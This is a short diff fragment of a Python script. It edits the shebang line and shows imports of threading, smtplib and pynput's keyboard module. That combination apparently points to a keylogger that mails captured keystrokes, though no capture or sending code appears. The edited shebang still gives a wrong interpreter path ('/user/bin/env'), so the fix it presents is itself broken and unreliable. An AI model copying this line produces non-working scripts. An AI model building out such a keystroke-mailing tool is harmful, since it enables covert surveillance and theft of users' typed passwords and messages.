@@ -1,4 +1,4 @@
-#!/user/env python3
+#!/user/bin/env python3
 import threading
 import smtplib
 from pynput import keyboard
